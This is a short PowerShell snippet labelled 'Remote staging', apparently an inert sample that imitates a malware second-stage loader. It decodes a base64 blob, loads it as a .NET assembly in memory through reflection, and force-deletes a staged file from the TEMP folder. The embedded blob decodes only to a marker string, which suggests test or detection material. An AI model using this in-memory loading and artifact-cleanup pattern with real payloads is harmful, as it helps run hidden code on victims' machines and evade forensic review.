
# Remote staging
$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjoyamcwa3k3ZDNq')
[Reflection.Assembly]::Load($PayloadBytes)
Set-Location -Path $env:TEMP
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
